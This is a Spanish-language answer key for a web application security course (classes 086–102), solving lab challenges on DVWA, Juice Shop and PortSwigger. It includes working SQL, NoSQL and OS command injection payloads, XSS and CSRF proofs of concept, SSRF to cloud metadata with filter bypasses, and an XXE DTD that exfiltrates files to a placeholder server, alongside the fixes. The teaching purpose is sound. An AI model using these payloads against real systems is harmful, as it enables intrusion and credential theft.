# Soluciones — Parte 4: Seguridad de aplicaciones web

> Estas son **claves de referencia** para el instructor y para autoevaluación. Intenta resolver cada reto y ejercicio por tu cuenta **antes** de mirar aquí: el valor está en el proceso, no en la respuesta. Puede haber más de una solución correcta; lo que sigue es una guía técnicamente válida.
>
> Volver al índice de la parte: [../classes/parte-4-seguridad-de-aplicaciones-web/README.md](../classes/parte-4-seguridad-de-aplicaciones-web/README.md)

**Marco ético (obligatorio).** Todo lo que sigue se practica **solo** sobre aplicaciones propias o explícitamente autorizadas: DVWA, OWASP Juice Shop, crAPI/VAmPI/DVGA, NodeGoat y los laboratorios oficiales de PortSwigger Web Security Academy (que autorizan su uso). Nunca apuntes herramientas ni payloads a sistemas de terceros sin permiso escrito. Trabaja en una VM o contenedor aislado, sin exponer los labs a Internet.

---

## Clase 086 — Arquitectura web moderna y superficie de ataque

### Solución del reto verificable

Objetivo: diagrama de superficie de ataque de Juice Shop con ≥12 puntos de entrada, fronteras de confianza y tabla de endpoints priorizada.

Pasos:

1. Levanta el lab: `docker run --rm -d -p 3000:3000 bkimminich/juice-shop`.
2. Enruta el navegador por Burp/ZAP e instala el CA del proxy para ver HTTPS.
3. Navega toda la app (login, registro, búsqueda, cesta, perfil, feedback, subida de foto) y captura el tráfico. Revisa `HTTP history` filtrando `/rest/` y `/api/`.
4. Inspecciona el JS (pestaña Sources / `main.js`) para extraer rutas embebidas y roles (`admin`, `accounting`) que no salen navegando.
5. Dibuja el diagrama en 4 zonas: **cliente (SPA Angular)** → **API (`/rest`, `/api`)** → **base de datos (SQLite)** → **servicios (envío de mail, almacenamiento de imágenes)**. Traza la frontera de confianza justo detrás de la API.
6. Construye la tabla: por cada endpoint anota método, ruta, parámetros, `auth requerida (sí/no)` y sensibilidad 1–3.

Evidencia que cumple el criterio: diagrama con las 4 zonas y fronteras marcadas + tabla con ≥12 filas donde cada endpoint tiene método, columna de autenticación y nivel 1–3 (p. ej. `POST /rest/user/login` = no auth, sensibilidad 3; `GET /api/Products` = no auth, 1; `GET /rest/basket/{id}` = auth, 3).

### Claves de los ejercicios

1. Ejemplos de puntos de entrada: query `?q=` de búsqueda, cuerpo JSON de login, header `Authorization: Bearer`, cookie `token`/`continueCode`, path param `/api/Products/{id}`, header `Content-Type`, campo de feedback, campo de nombre de archivo en la subida, header `Host`, header `User-Agent`, parámetro de orden/paginación, campo de cupón.
2. Cliente: validación de formato de email, longitud de contraseña, formato de tarjeta en JS. Servidor: verificación de credenciales, autorización por objeto, unicidad de email, control del precio. Regla: los controles de cliente son cosméticos.
3. Endpoints ocultos típicos en el JS: `/rest/admin/application-configuration`, `/api/Quantitys`, `/rest/products/search`. Se hallan buscando cadenas `'/rest/` y `'/api/` en `main.js`.
4. El token entra en el header `Authorization` (o cookie) desde el login, viaja cliente→API y se valida en cada endpoint autenticado; no debe llegar a la base de datos como dato ni loguearse.
5. Endpoint de metadata: `169.254.169.254` (AWS IMDS, GCP con header `Metadata-Flavor: Google`, Azure `?api-version`). Sensible porque entrega credenciales temporales de la instancia; alcanzable vía SSRF si no se protege (usar IMDSv2 con token).
6. SPA: el código está en el cliente, expone endpoints y la API es la superficie real; el estado vive en tokens. SSR: HTML generado en servidor, menos endpoints visibles, superficie más concentrada en parámetros de formulario y rutas.

---

## Clase 087 — OWASP Top 10: panorama general

### Solución del reto verificable

Objetivo: matriz Top 10 (2021) con ejemplo, CWE principal y control por categoría.

| # | Categoría | Ejemplo concreto | CWE | Control (causa raíz) |
|---|-----------|------------------|-----|----------------------|
| A01 | Broken Access Control | IDOR: `/account?id=124` muestra datos ajenos | CWE-284/639 | Authz por objeto en servidor (comprobar propietario) |
| A02 | Cryptographic Failures | Contraseñas en MD5 sin sal | CWE-327/916 | Argon2id/bcrypt, TLS, cifrado en reposo |
| A03 | Injection (incluye XSS) | `'' OR 1=1--` en login | CWE-89/79 | Consultas parametrizadas + codificación de salida |
| A04 | Insecure Design | Recuperación de cuenta solo con pregunta secreta | CWE-657 | Modelado de amenazas y requisitos de seguridad |
| A05 | Security Misconfiguration | Directory listing y panel admin por defecto | CWE-16 | Hardening, deshabilitar defaults, IaC revisada |
| A06 | Vulnerable/Outdated Components | Librería con CVE conocido sin parchear | CWE-1104 | SCA/SBOM y actualización continua |
| A07 | Identification & Auth Failures | Sin bloqueo ante fuerza bruta | CWE-287 | MFA, rate limiting, gestión de sesión robusta |
| A08 | Software & Data Integrity Failures | Deserialización insegura / update sin firma | CWE-502 | Firmas, verificación de integridad, no deserializar input |
| A09 | Security Logging & Monitoring Failures | Login fallidos sin registrar | CWE-778 | Logging de eventos de seguridad + alertas |
| A10 | SSRF | `url=http://169.254.169.254/...` | CWE-918 | Allowlist de destinos, bloqueo de IP internas |

Evidencia que cumple el criterio: 10 filas completas, ejemplos distintos y realistas, cada control ataca la causa (no el síntoma).

### Claves de los ejercicios

1. CWE-89→A03 (SQLi), CWE-79→A03 (XSS, fusionado en 2021), CWE-352→A01 (CSRF absorbido en Broken Access Control), CWE-918→A10 (SSRF), CWE-611→A05 (XXE, absorbido en Misconfiguration).
2. En 2021 XSS pasó a formar parte de A03:Injection porque comparte causa raíz: mezclar datos no confiables con un intérprete/contexto sin la codificación adecuada.
3. Insecure Design (no es bug de código): permitir compras con saldo negativo, o un flujo de reset que no exige poseer el email. Es un fallo de requisitos/arquitectura, no de una línea concreta.
4. A05 (misconfiguration): panel admin con credenciales por defecto expuesto. A06 (componentes): usar una versión de la librería que ya tiene un CVE. Uno es cómo se configura; el otro es qué versión se usa.
5. Broken Access Control encabeza porque es la más prevalente (94% de apps testeadas presentaban alguna forma) y su impacto es directo: acceso a datos/funciones ajenas.
6. Un control por categoría: A01 authz por objeto; A02 cripto fuerte; A03 parametrización; A04 threat modeling; A05 hardening; A06 SCA; A07 MFA; A08 firmas; A09 logging; A10 allowlist de egress.

---

## Clase 088 — Burp Suite: configuración y flujo de trabajo

### Solución del reto verificable

Objetivo: fuerza bruta con Intruder al login de DVWA (50 contraseñas) detectando la válida por anomalía de longitud/código.

Pasos:

1. En DVWA configura `Security: Low` para el ejercicio de fuerza bruta (módulo Brute Force).
2. Captura el `GET /vulnerabilities/brute/?username=admin&password=x&Login=Login` en Proxy y envíalo a Intruder.
3. Ataque tipo **Sniper**, una sola posición de payload marcada sobre el valor de `password`.
4. Carga una wordlist de 50 candidatas (incluye la correcta, `password`, para el lab).
5. Añade la cookie de sesión válida (PHPSESSID + security=low) en la request.
6. Lanza el ataque y ordena por columna **Length**: la respuesta correcta tiene longitud distinta (mensaje "Welcome" vs. "incorrect"). Con logins que devuelven 302 vs 200, ordena por Status.

Evidencia que cumple el criterio: captura de Intruder mostrando la fila anómala (longitud distinta) con `admin:password`, documentando la posición de payload y el filtro/columna usada para detectarla (grep-match "Welcome" opcional).

### Claves de los ejercicios

1. Proxy → Options → Match and Replace: regla tipo "Request header", match vacío, replace `X-Mi-Cabecera: test` para inyectarla en toda petición.
2. Cluster bomb: dos posiciones de payload con dos payload sets; prueba **todas** las combinaciones (útil para user×password).
3. HTTP history → filtro por Status code → marca solo la clase `5xx`.
4. Botón derecho sobre el item → "Add comment" / colorea; queda anotado en la columna de comentarios del historial.
5. Extender → BApp Store → instalar "JSON Web Tokens" (requiere Jython para algunas).
6. Sniper: una posición, un payload set, prueba secuencialmente (N peticiones). Pitchfork: varias posiciones en paralelo, empareja el payload N de cada set (útil para pares user/pass ya emparejados). Cluster bomb = producto cartesiano.

---

## Clase 089 — OWASP ZAP

### Solución del reto verificable

Objetivo: reporte ZAP de Juice Shop con ≥3 alertas medio/alto verificadas manualmente y ≥1 falso positivo descartado.

Pasos:

1. En ZAP define el sitio `http://localhost:3000` en scope. Ejecuta Spider tradicional + AJAX Spider (Juice Shop es SPA, necesita AJAX).
2. Lanza un Active Scan sobre el scope.
3. Filtra alertas por riesgo Medio/Alto. Candidatas reales: cabeceras de seguridad ausentes (CSP), SQLi en `/rest/products/search?q=`, exposición de información.
4. Verifica cada una manualmente: reproduce la SQLi en Burp/navegador (`q=';--`), comprueba en DevTools que falta la CSP, etc.
5. Marca un falso positivo típico (p. ej. "X-Content-Type-Options" reportado donde no aplica, o un supuesto XSS que en realidad se escapa) y justifica por qué no es explotable.
6. Genera el reporte HTML/MD desde `Report → Generate Report`.

Evidencia que cumple el criterio: reporte con 3 alertas medio/alto y, por cada una, la reproducción manual (captura de la petición/respuesta) + el falso positivo con su justificación.

### Claves de los ejercicios

1. El AJAX spider descubre más URLs en una SPA porque ejecuta JS y sigue eventos del DOM; el spider tradicional solo parsea HTML estático y encuentra pocas.
2. Context → Authentication (form-based con user/pass) + Users; ZAP mantiene la sesión para escanear zonas autenticadas.
3. Ejemplo de alerta Alta: SQL Injection. Explicación: input reflejado en una query sin parametrizar permite alterar la lógica de la consulta.
4. Baseline scan: WARN = alerta informativa/no bloqueante; FAIL = alerta que supera el umbral configurado. Se interpreta según el `-c` fichero de reglas.
5. Script (ZAP scripting, tipo "HttpSender" o regla de scope) que excluya del scope las URLs que contengan `logout`/`signout` para no cerrar la sesión.
6. En CI el baseline scan debe **fallar el build** cuando aparecen alertas nuevas por encima del umbral (p. ej. cualquier High), evitando regresiones; las WARN conocidas se ponen en el fichero de ignorados.

---

## Clase 090 — Mapeo, spidering y descubrimiento de contenido

### Solución del reto verificable

Objetivo: inventario de ≥5 rutas de Juice Shop no descubribles solo navegando.

Pasos:

1. Dirbusting con feroxbuster/ffuf: `ffuf -w common.txt -u http://localhost:3000/FUZZ -mc 200,301,403`.
2. Analiza el JS (`main.js`) buscando cadenas `/rest/` y `/api/` para extraer endpoints ocultos.
3. Fuzz de parámetros ocultos con `ffuf -w params.txt -u 'http://localhost:3000/rest/products/search?FUZZ=x'` filtrando por tamaño.
4. Documenta cada ruta con la herramienta que la halló y la evidencia (código/tamaño de respuesta).

Rutas de ejemplo: `/ftp` (directory listing), `/rest/admin/application-configuration`, `/api/Feedbacks`, `/rest/products/reviews`, `/metrics` (Prometheus).

Evidencia que cumple el criterio: tabla de ≥5 rutas, cada una con método de descubrimiento + evidencia + hipótesis de por qué podría ser vulnerable (p. ej. `/ftp` → exposición de archivos; `application-configuration` → filtración de config).

### Claves de los ejercicios

1. `directory-list-2.3-medium.txt` (~220k) descubre muchas más rutas que `common.txt` (~4.7k) a costa de mucho más ruido/tiempo.
2. `-fs <tamaño>` (filter size) elimina las respuestas "not found" personalizadas que devuelven 200 con un tamaño constante.
3. Buscar en el JS una cadena de ruta que no aparezca en la navegación (p. ej. un endpoint de admin) demuestra endpoints ocultos.
4. `subfinder -d midominio.com` (sobre un dominio propio) enumera subdominios pasivamente.
5. Parámetros ocultos: fuzz con Arjun/ffuf sobre un endpoint; p. ej. `id`, `admin`, `debug`.
6. Un `403` indica que el recurso **existe** pero está prohibido (hay algo que proteger); un `404` no existe. El 403 es una pista de superficie interesante (posible bypass de authz).

---

## Clase 091 — Inyección SQL: fundamentos

### Solución del reto verificable

Objetivo: extraer usuarios y hashes de `users` en DVWA vía UNION SQLi y reescribir la consulta de forma segura.

Pasos:

1. DVWA módulo SQL Injection, security Low. Confirma inyección: `1' OR '1'='1`.
2. Cuenta columnas con `1' ORDER BY 1-- -`, incrementando hasta el error (en DVWA son 2).
3. UNION: `1' UNION SELECT user, password FROM users-- -`.
4. Recoge los hashes MD5 y crackéalos offline con hashcat en tu lab: `hashcat -m 0 hashes.txt rockyou.txt`.
5. Reescribe seguro (PHP PDO): `$stmt = $pdo->prepare('SELECT first_name,last_name FROM users WHERE user_id = ?'); $stmt->execute([$id]);`.

Evidencia que cumple el criterio: listado exfiltrado (usuario:hash y contraseña crackeada), el payload UNION exacto y el código con prepared statements que ya no permite inyección.

### Claves de los ejercicios

1. Motor por sintaxis: MySQL comenta con `--` (con espacio) o `#`; errores mencionan `You have an error in your SQL syntax`. MSSQL usa `--`, errores con `Unclosed quotation`. Oracle no permite `LIMIT`, usa `ROWNUM`.
2. Hash de admin: `admin' UNION SELECT NULL, password FROM users WHERE user='admin'-- -`, luego hashcat `-m 0` (MD5) con rockyou.
3. Nombre de la BD actual: `... UNION SELECT database(), NULL-- -` (MySQL).
4. `ORDER BY N` ordena por la columna N; cuando N supera el número de columnas, el motor devuelve error, revelando el conteo exacto necesario para el UNION.
5. Parametrizada PHP: `prepare(...); execute([$id])` con PDO. Python: `cursor.execute("SELECT ... WHERE id=%s", (id,))` (nunca concatenar).
6. UNION-based: recuperas datos directamente en la respuesta uniendo un SELECT. Error-based: fuerzas un error de BD que revela datos en el mensaje (p. ej. `extractvalue`/`updatexml` en MySQL).

---

## Clase 092 — Inyección SQL avanzada y ciega (blind)

### Solución del reto verificable

Objetivo: extraer la contraseña de `administrator` en un lab de blind SQLi de PortSwigger con solo condiciones booleanas.

Pasos:

1. Identifica el oráculo: una condición verdadera devuelve "Welcome back" y una falsa no (p. ej. cookie `TrackingId` inyectable).
2. Determina la longitud: `... AND (SELECT LENGTH(password) FROM users WHERE username='administrator')=20`.
3. Extrae carácter a carácter con búsqueda binaria por posición: `... AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator') > 'm'` y refina.
4. Automatiza con Intruder (Cluster bomb: posición del carácter × candidato) o con un script.

Evidencia que cumple el criterio: contraseña recuperada, configuración de Intruder (posiciones y payload set), número de peticiones y el lab marcado como resuelto.

### Claves de los ejercicios

1. 20 caracteres con búsqueda lineal (`=`) ≈ 20 × alfabeto (~95) peticiones. Registra el total real de tu ataque.
2. Búsqueda binaria con `>`: ~log2(95) ≈ 7 peticiones por carácter → ~140 en total, mucho menos que la lineal.
3. Time-based: MySQL `... AND IF(cond, SLEEP(5), 0)`; MSSQL `... IF(cond) WAITFOR DELAY '0:0:5'`; PostgreSQL `... AND CASE WHEN cond THEN pg_sleep(5) ELSE 0 END`.
4. La blind temporal es la más lenta/ruidosa porque cada bit cuesta un retardo (segundos) y genera muchas conexiones lentas fáciles de detectar.
5. Oráculo por tamaño: si la respuesta cambia de longitud según la condición (más/menos contenido), úsalo como verdadero/falso sin depender de un texto.
6. Second-order: registras un usuario con nombre `admin'--`; el payload no se ejecuta al insertar, sino después cuando otra consulta reutiliza ese valor almacenado sin parametrizar.

---

## Clase 093 — SQLMap

### Solución del reto verificable

Objetivo: volcar la tabla de usuarios de DVWA con sqlmap desde una request de Burp y reproducir manualmente un payload.

Pasos:

1. Guarda la petición vulnerable de DVWA desde Burp (`Copy to file` → `req.txt`), incluyendo la cookie de sesión.
2. `sqlmap -r req.txt --batch --dbms=mysql -D dvwa -T users --dump`.
3. sqlmap identifica la inyección, extrae columnas y hace el dump al CSV; puede crackear los hashes con su diccionario.
4. Toma uno de los payloads que muestra en verbose (`-v 3`), por ejemplo un UNION o un boolean-based, y ejecútalo a mano en el navegador entendiendo cada parte.

Evidencia que cumple el criterio: CSV volcado (usuarios+hashes), el comando exacto y la explicación de un payload concreto de sqlmap (qué hace cada cláusula), no solo "funcionó".

### Claves de los ejercicios

1. `--banner` devuelve versión y motor exacto.
2. `--technique=BT` fuerza solo Boolean+Time; comparado con la detección automática, verás qué técnicas descarta o usa por defecto.
3. `--tamper=space2comment` sustituye espacios por `/**/` para evadir filtros que bloquean el espacio.
4. `--dump -D dvwa -T users --where "user='admin'"` vuelca solo esa fila.
5. `--os-shell` intenta subir un stager y ejecutar comandos en el SO: es RCE, muy destructivo y fuera de scope salvo autorización explícita; no usar en bug bounty sin permiso.
6. Impacto del dump: si expone credenciales (hashes crackeables) y PII, la gravedad es Crítica; documenta qué columnas se extrajeron y su sensibilidad.

---

## Clase 094 — Inyección NoSQL

### Solución del reto verificable

Objetivo: bypass de autenticación NoSQL + extracción parcial de credencial con `$regex` ciega.

Pasos:

1. En el lab (NodeGoat / endpoint Mongo de Juice Shop), intercepta el login. Si el body es JSON, envía `{"username":"admin","password":{"$ne":null}}` o `{"$gt":""}` para lograr login sin conocer la contraseña.
2. Confirma que entraste como `admin` (respuesta/token de sesión válido).
3. Blind por `$regex`: envía `{"username":"admin","password":{"$regex":"^a"}}` y observa si el login es exitoso; itera el primer carácter con `^X`, luego `^aX`, etc., reconstruyendo el valor.

Evidencia que cumple el criterio: prueba del login sin contraseña (captura de la respuesta autenticada) + los primeros caracteres del valor real recuperados con `$regex`, documentando cada payload.

### Claves de los ejercicios

1. En JSON: `{"password":{"$ne":null}}`. En query string (parseada como objeto por qs): `password[$ne]=`. Mismo operador, distinta serialización.
2. 8 caracteres con `$regex` blind: por cada posición prueba `^chars{i}[a-z0-9]` fijando el prefijo hallado; ~alfabeto × 8 intentos.
3. `{"$gt":""}` funciona porque toda cadena real es "mayor que" la cadena vacía, así que el operador siempre matchea un usuario existente.
4. Defensa en Node: `if (typeof req.body.password !== 'string') return 400;` (rechazar objetos), o usar Mongoose con esquema tipado y `sanitize`.
5. `$where` ejecuta JavaScript arbitrario del lado servidor sobre cada documento: lento y peligroso (permite inyección de JS); desaconsejado/deshabilitado en prod.
6. Similitud: ambos mezclan input no confiable con un intérprete de consultas. Diferencia: SQL usa cadenas SQL; NoSQL abusa de operadores del lenguaje de consulta (objetos JSON), y el vector suele ser la deserialización de tipos.

---

## Clase 095 — Inyección de comandos del sistema operativo

### Solución del reto verificable

Objetivo: RCE en DVWA Medium (filtra algunos caracteres) evadiendo el filtro y leyendo `/etc/passwd`.

Pasos:

1. DVWA Medium filtra `&&` y `;`. Usa un separador alternativo permitido: `|` (pipe) o `%0a` (newline). Ejemplo en el campo IP: `127.0.0.1 | cat /etc/passwd`.
2. Si filtra el espacio, usa `${IFS}`: `127.0.0.1|cat${IFS}/etc/passwd`.
3. Confirma la ejecución observando el contenido de `/etc/passwd` en la respuesta.
4. Corrección: no pasar input a un shell. En PHP usa `escapeshellarg()` y valida con allowlist de IP; idealmente reemplaza el `ping` por una librería que no invoque shell.

Evidencia que cumple el criterio: payload que evade el filtro Medium, captura de `/etc/passwd` leído, y el código corregido (validación estricta + sin `shell=True`/sin concatenar al shell).

### Claves de los ejercicios

1. Metacaracteres: `;` (ejecuta secuencial), `&&` (ejecuta si el anterior tuvo éxito), `||` (si falló), `|` (pipe: encadena stdout→stdin), `` ` ``/`$()` (sustitución de comando: ejecuta e inserta la salida).
2. Inyección ciega por tiempo: `127.0.0.1 & ping -c 10 127.0.0.1` o `; sleep 10`; si la respuesta tarda ~10s, hay ejecución.
3. Adaptación a Windows: separador `&`, y la variable de nombre de equipo es **`%COMPUTERNAME%`** (ver nota de erratas: el README dice `%COMPUSER%`, que no existe). Para el usuario, `%USERNAME%`.
4. Command injection: inyectas comandos nuevos al shell. Argument injection: no ejecutas otro comando, pero abusas de flags/argumentos del binario ya invocado (p. ej. añadir `--output` a `curl`) para alterar su comportamiento.
5. Seguro en Python: `subprocess.run(["ping","-c","1", ip], shell=False)` pasando lista de argumentos; nunca `shell=True` con string concatenado.
6. Allowlist de IP: valida con regex/parseo (`ipaddress.ip_address(x)`); rechaza cualquier carácter que no sea dígito o punto antes de usar el valor.

---

## Clase 096 — Cross-Site Scripting (XSS) reflejado

### Solución del reto verificable

Objetivo: lab de XSS reflejado de PortSwigger que exija escapar de un contexto y ejecutar `alert(document.cookie)`.

Pasos:

1. Identifica dónde se refleja tu input (atributo `value="..."`, dentro de `<script>`, o cuerpo HTML).
2. Contexto atributo: cierra el atributo y el tag e inyecta un handler: `"><svg onload=alert(document.cookie)>`.
3. Contexto script (`var x='INPUT'`): rompe la cadena: `'-alert(document.cookie)-'` o `';alert(document.cookie);//`.
4. Ejecuta y verifica que el lab se marca resuelto.

Evidencia que cumple el criterio: lab resuelto + explicación del contexto de inyección, el payload y la codificación de salida que lo prevendría (HTML-encode en cuerpo, attribute-encode en atributos, JS-string-escape en script).

### Claves de los ejercicios

1. Atributo: `" autofocus onfocus=alert(1) x="`. Script: `';alert(1)//`.
2. Evadir filtro de `script`: eventos sin `script` (`<img src=x onerror=alert(1)>`), o mayúsculas/anidado si el filtro es ingenuo (`<scr<script>ipt>`).
3. HttpOnly impide que `document.cookie` lea la cookie desde JS, mitigando el robo de sesión; pero el XSS sigue ejecutándose y puede hacer acciones en nombre del usuario (keylogging, peticiones autenticadas).
4. CSP que bloquea: `Content-Security-Policy: script-src 'self'` sin `'unsafe-inline'` impide ejecutar el `onerror`/inline; obliga a scripts propios.
5. Reflejado: el payload viaja en la petición y se refleja en la respuesta inmediata. Almacenado: se guarda y se sirve a otros. DOM: el sink está en JS del cliente; el servidor puede no verlo nunca.
6. Codifica la salida según contexto (p. ej. `htmlspecialchars()` en PHP, autoescape de la plantilla) para que el input se muestre como texto, no como marcado.

---

## Clase 097 — XSS almacenado y basado en DOM

### Solución del reto verificable

Objetivo: XSS almacenado en Juice Shop que ejecute una acción en nombre de otro usuario, y su corrección.

Pasos:

1. Encuentra un campo persistente que no sanitiza (p. ej. nombre de producto/review, o el campo de la cesta según la versión). Juice Shop tiene un reto de XSS almacenado en la sección de "Customer Feedback"/"last login IP".
2. Inyecta un payload persistente que dispare una petición autenticada, no solo `alert`: `<img src=x onerror="fetch('/rest/basket/OTHER',{...})">` o que llame a un endpoint de cambio.
3. Comprueba que se ejecuta cuando **otra sesión** (p. ej. admin) ve el contenido.
4. Corrige: sanitiza la salida (DOMPurify en el front, output encoding en el server) y aplica CSP.

Evidencia que cumple el criterio: payload persistente disparándose en una segunda sesión y realizando una acción, con source, sink y defensa identificados.

### Claves de los ejercicios

1. Sinks peligrosos: `innerHTML`, `outerHTML`, `document.write`, `eval`, `setTimeout(string)`, `location`/`location.href`, `element.setAttribute('src'/'href', ...)`. Ejecutan/interpretan datos como código o marcado.
2. El stored es más grave porque afecta a todo usuario que vea el contenido (incl. admins), no requiere que la víctima haga clic en un enlace preparado y persiste.
3. DOM XSS sin servidor: payload en el fragmento `#` (`location.hash`) que un `innerHTML` inserta en la página; el `#` no se envía al servidor, así que el backend nunca ve el payload.
4. `DOMPurify.sanitize(input)` elimina el marcado peligroso; demuestra que tu `<img onerror>` se convierte en texto inerte.
5. React escapa por defecto todo lo interpolado en JSX; `dangerouslySetInnerHTML` reintroduce XSS al inyectar HTML crudo sin sanitizar.
6. CSP con Trusted Types: `Content-Security-Policy: require-trusted-types-for 'script'` obliga a pasar los sinks del DOM por una policy que sanitiza.

---

## Clase 098 — Cross-Site Request Forgery (CSRF)

### Solución del reto verificable

Objetivo: lab CSRF de PortSwigger con defensa parcial (token mal validado) para cambiar el email de la víctima.

Pasos:

1. Analiza cómo se valida el token: ¿se comprueba solo su presencia? ¿se acepta el token de otra sesión? ¿se valida solo si el parámetro existe?
2. Construye el PoC HTML con un `<form>` auto-enviado hacia el endpoint de cambio de email, incluyendo el token robado/omitido según la debilidad.
3. Si el token se valida solo por presencia, incluye cualquier valor o elimínalo. Si se puede reusar, usa uno propio.
4. Aloja el PoC en el exploit server del lab y entrégalo a la víctima.

Evidencia que cumple el criterio: lab resuelto, PoC funcional y explicación de la debilidad concreta del token (p. ej. "no se ata a la sesión") y su corrección (token sincronizado por sesión, verificar valor).

### Claves de los ejercicios

1. PoC GET: `<img src="https://app/change?email=x">`. PoC POST: `<form action=... method=POST><input name=email value=x><\/form><script>form.submit()</script>`.
2. `SameSite=Strict` no envía la cookie en navegación cross-site, lo que rompe flujos legítimos como llegar logueado desde un enlace externo; `Lax` es el compromiso habitual.
3. Token validado solo por presencia: envíalo con cualquier valor (o vacío) y pasa la comprobación.
4. Un endpoint JSON con `Content-Type: application/json` no es CSRF-eable con formularios HTML simples (no pueden fijar ese content-type sin preflight CORS); sí lo es si acepta `text/plain` o form-encoded.
5. Defensa: token anti-CSRF sincronizado por sesión + `SameSite=Lax/Strict` + verificar cabecera `Origin`/`Referer`.
6. CSRF: la víctima autenticada ejecuta una acción no deseada; el atacante abusa de la sesión del navegador. SSRF: el **servidor** hace la petición a un destino elegido por el atacante. Nombres parecidos, actores y objetivos opuestos.

---

## Clase 099 — Server-Side Request Forgery (SSRF)

### Solución del reto verificable

Objetivo: lab SSRF de PortSwigger que acceda al endpoint de metadata y use las credenciales para completar el objetivo.

Pasos:

1. Localiza el parámetro que hace que el servidor pida una URL (p. ej. `stockApi=http://...`).
2. Redirígelo al metadata: `http://169.254.169.254/latest/meta-data/`.
3. Navega la jerarquía: `.../iam/security-credentials/` → nombre del rol → credenciales (AccessKeyId, SecretAccessKey, Token).
4. Usa el dato/credencial para la acción que pide el lab (p. ej. borrar un usuario en el panel interno).

Evidencia que cumple el criterio: lab resuelto, la URL SSRF usada, el dato/credencial extraído y la defensa (allowlist de destinos, bloqueo de `169.254.0.0/16` y rangos privados, no seguir redirecciones, IMDSv2).

### Claves de los ejercicios

1. Features que introducen SSRF: importación de URL/imagen remota, webhooks, generadores de PDF/thumbnails, validadores de URL, proxies de API, integraciones de "fetch por URL".
2. El metadata es crítico porque entrega credenciales temporales de la instancia sin autenticación desde dentro; con SSRF equivale a robar las llaves de la nube.
3. Evadir blocklist de `127.0.0.1`: usar `http://localhost`, `http://0.0.0.0`, `http://127.1`, notación decimal `http://2130706433`, o IPv6 `http://[::1]`.
4. Redirección abierta: apunta la URL a un dominio permitido que redirige (302) a `169.254.169.254`; si el servidor sigue redirects, salta el allowlist.
5. SSRF: el servidor es el que hace la petición. CSRF: el navegador de la víctima la hace. (Ver también clase 098.)
6. Defensa: allowlist de destinos permitidos, resolver el DNS y bloquear IP privadas/link-local, prohibir seguir redirecciones, y usar IMDSv2 con token.

---

## Clase 100 — XML External Entities (XXE)

### Solución del reto verificable

Objetivo: lab de XXE ciega de PortSwigger exfiltrando un archivo mediante DTD externo alojado por ti.

Pasos:

1. Confirma que el endpoint parsea XML y que la salida no refleja entidades (por eso es ciega/OOB).
2. Aloja en tu exploit server un DTD malicioso que lea el archivo y lo exfiltre a tu servidor:

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://TU-SERVER/?x=%file;'>">
%eval;
%exfil;
```

3. En la petición, declara la entidad de parámetro que carga tu DTD externo: `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://TU-SERVER/malicious.dtd"> %xxe;]>`.
4. Recibe el contenido del archivo en los logs de tu servidor.

Evidencia que cumple el criterio: lab resuelto, el DTD externo, el payload y el dato exfiltrado, más la config de parser segura (deshabilitar DOCTYPE/DTD y entidades externas).

### Claves de los ejercicios

1. `/etc/hostname` revela el nombre del host (bajo impacto); `/etc/passwd` confirma lectura de archivos del sistema y usuarios (mayor impacto/prueba de LFI).
2. XXE→SSRF: `<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">` usa el parser para pedir el metadata.
3. DTD externo para OOB (ver reto): dos entidades de parámetro, una lee el archivo y otra lo envía a tu servidor.
4. Un SVG (que es XML) subido a una app que lo parsea puede llevar un DOCTYPE con entidad externa → XXE al procesarse.
5. Config segura Java: `factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`. Python: usar `defusedxml` o `resolve_entities=False` en lxml.
6. SAML usa XML firmado; parsers mal configurados que procesan DTD han permitido XXE históricamente para leer archivos o hacer SSRF durante la validación de la aserción.

---

## Clase 101 — Fallos de autenticación y bypass

### Solución del reto verificable

Objetivo: lab de PortSwigger de enumeración + fuerza bruta (o bypass de MFA) accediendo a la cuenta objetivo.

Pasos:

1. Enumeración: prueba usuarios y detecta la señal que diferencia válido de inválido (mensaje "Incorrect password" vs "Invalid username", o diferencia de tiempo de respuesta).
2. Con el usuario confirmado, fuerza bruta la contraseña con Intruder usando una wordlist.
3. Detecta el acierto por cambio de código/longitud/redirección.
4. (Alternativa MFA): explota un flujo donde el segundo factor se puede omitir o cambiar el user en el paso 2.

Evidencia que cumple el criterio: lab resuelto, la señal que reveló el usuario válido (o el fallo de MFA), la credencial/técnica y los controles que lo evitarían (mensajes genéricos, rate limiting, MFA robusto).

### Claves de los ejercicios

1. Enumeración por mensaje: distinta respuesta según user exista. Por tiempo: el servidor tarda más cuando el user existe (porque llega a verificar el hash). Mide ambos por separado.
2. Credential stuffing: reutilizar pares user:pass filtrados de otras brechas. Defensa: MFA, detección de reuso de contraseñas conocidas, rate limiting y CAPTCHA adaptativo.
3. Token de reset: evalúa entropía (¿es predecible/secuencial?) y expiración (¿caduca y es de un solo uso?). Débil = adivinable o reutilizable.
4. Bypass de MFA: (a) omitir el paso 2 accediendo directo al recurso; (b) cambiar el usuario entre paso 1 y 2; (c) brute force del OTP sin rate limit; (d) reuso del código. Prevención: atar el reto MFA a la sesión, limitar intentos, expirar OTP.
5. Mensajes genéricos ("credenciales inválidas") impiden que el atacante distinga si falló el usuario o la contraseña, frenando la enumeración.
6. Rate limiting sensato: límite por cuenta (p. ej. 5 intentos/15 min con backoff) y por IP (para no permitir spray masivo), con bloqueos temporales y alertas.

---

## Clase 102 — Gestión de sesiones y ataques asociados

### Solución del reto verificable

Objetivo: demostrar session fixation o token válido tras logout, y su corrección.

Pasos (session fixation):

1. En un lab que no rota el ID de sesión al autenticar, obtén un ID como anónimo.
2. Fuerza a la víctima a usar ese ID (parámetro/cookie).
3. Cuando la víctima se autentica con ese mismo ID, tú ya lo conoces → secuestras su sesión.

Pasos (token tras logout): copia el token, haz logout, reenvía una petición autenticada con el token; si sigue funcionando, el logout no invalida en servidor.

Evidencia que cumple el criterio: mismo token antes/después de login (fixation) o reuso tras logout, más la defensa (rotar el ID en el login, invalidar en servidor al cerrar sesión).

### Claves de los ejercicios

1. Burp Sequencer captura muchos tokens y estima la entropía; buena entropía = impredecible (alta), mala = patrones/secuencial.
2. Session fixation: reproduce con un lab donde el ID no cambia tras login (ver reto).
3. Atributos de cookie: `Secure` (solo HTTPS), `HttpOnly` (no accesible por JS), `SameSite` (anti-CSRF), `Path`/`Domain` (alcance), `Expires/Max-Age` (duración).
